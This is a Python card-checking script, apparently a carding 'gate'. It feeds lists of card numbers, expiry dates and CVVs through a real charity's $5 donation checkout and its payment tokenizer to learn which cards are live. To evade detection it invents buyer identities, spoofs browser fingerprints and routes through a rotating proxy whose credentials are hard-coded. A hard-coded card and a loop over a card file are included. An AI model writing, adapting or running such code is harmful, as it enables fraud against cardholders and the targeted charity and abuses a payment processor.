
import random, time, base64, uuid
import requests
from faker import Faker
from random import choice
from urllib.parse import quote, unquote
import curl_cffi
from colorama import init, Fore
from fake_useragent import UserAgent


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email(domain="gmail.com").replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None


def ccn_gate(card):
    max_retries = 100
    retry_count = 0
    while retry_count < max_retries:
        try:
            init(autoreset=True)
            #============[Funcions Need]============#
            cliente = curl_cffi.requests.Session(impersonate=choice(["safari17_0", "safari17_2_ios", "safari15_3"]))
            cliente.proxies = {"https": "http://ykblevio-us-rotate:fjd95pa1ji7t@p.webshare.io:80"}
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 4: ano_number = ano_number[2:4]
            agente_user = UserAgent().random
            cliente.headers.update = {'User-Agent', agente_user}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            number = random.randint(1111, 9999)
            street = f"{name}+street+{number}"
            email = usuario()['email']
            phone = usuario()['phone']

            #============[Requests 1]============#
            respons = cliente.get('https://sreedevipeetham.org/donations')
            price_id = capture(respons.text, '<span  id="price_', '"')

            #============[Requests 2]============#
            headers = {'User-Agent': agente_user,'Accept': '*/*','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://sreedevipeetham.org','Referer': 'https://sreedevipeetham.org/donations'}
            data    = f'ids%5B%5D={price_id}&totalPrice=5&qty%5B%5D=1&ctg%5B%5D=DONATIONS&serviceTypes%5B%5D=GENERAL+DONATIONS&serviceName%5B%5D=Flower+Seva&serviceAmount%5B%5D=5.00&cart_type=DONATIONS&image%5B%5D=%2Fuploads%2Fprofile%2Fimage-1743574229065-48347557.png&description%5B%5D=&cart_ctg%5B%5D=DONATIONS&service_desc%5B%5D=&isTextinputBox%5B%5D='
            respons = cliente.post('https://sreedevipeetham.org/Donations/addCart', headers=headers, data=data)
            if 'Country restrictions' in respons.text:
                print("Reintentando por rentricciones de pais...")
                retry_count += 1

            #============[Requests 3]============#
            headers = {'User-Agent': agente_user,'Accept': 'application/json, text/javascript, */*; q=0.01','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://sreedevipeetham.org','Referer': 'https://sreedevipeetham.org/donations/checkout'}
            data    = f'fname={last}&lname={name}&email={quote(email)}&phone={phone}&countryCode=%2B1&checkStatus=2&state=NEW+YORK&city=NEW+YORK&zipcode=10080&address_line1={street}'
            respons = cliente.post('https://sreedevipeetham.org/Home/getOrAddCustomer', headers=headers, data=data)

            #============[Requests 4]============#
            headers = {'X-Sending-Script': 'https://www.bridgepaynetsecuretx.com/Bridgepay.WebSecurity/TokenPay/js/tokenPay.js','X-Tokenpay-Key': 'tokenpay35574api20252007022038330','X-Requested-With': 'XMLHttpRequest','User-Agent': agente_user,'Accept': '*/*','Content-Type': 'application/json','Origin': 'https://www.bridgepaynetsecuretx.com','Referer': 'https://www.bridgepaynetsecuretx.com/WebSecurity/TokenPay/js/dataValidator.html'}
            data    = {"number":cc_number,"expMonth":mes,"expYear":ano_number,"zipcode":""}
            respons = cliente.post('https://www.bridgepaynetsecuretx.com/WebSecurity/TokenPayHandler.ashx', headers=headers, json=data)
            token = capture(respons.text, '"token":"', '"')

            #============[Requests 5]============#
            headers = {'User-Agent': agente_user,'Accept': 'application/json, text/javascript, */*; q=0.01','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://sreedevipeetham.org','Referer': 'https://sreedevipeetham.org/donations/checkout'}
            data    = f'token={token}&totolAmt=5&name={name}+{last}&address={street}&zipcode=10080&general_donation=0&acharya_sambhavana=0'
            respons = cliente.post('https://sreedevipeetham.org/MPI_Payments/Paynow', headers=headers, data=data)


            return card, respons.json().get('message')
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return Fore.YELLOW + f"{cc_number}|{mes.zfill(2)}|{ano_number}|{cvv}|error|retries_fail|"
    

print(ccn_gate("4815153061705285|01|2028|498"))

"""if __name__ == "__main__":
    file = open('card.txt', 'r')
    lines = file.readlines()
    for position, x in enumerate(lines):
        #time.sleep(5)
        cc, mes, ano, cvv = x.split("|")
        gateway = ccn_gate(f"{cc}|{mes}|{ano}|{cvv.strip()}")
        print(gateway)
        with open('card.txt', "w")as f:
            f.writelines(lines[position+1:])
            f.close()"""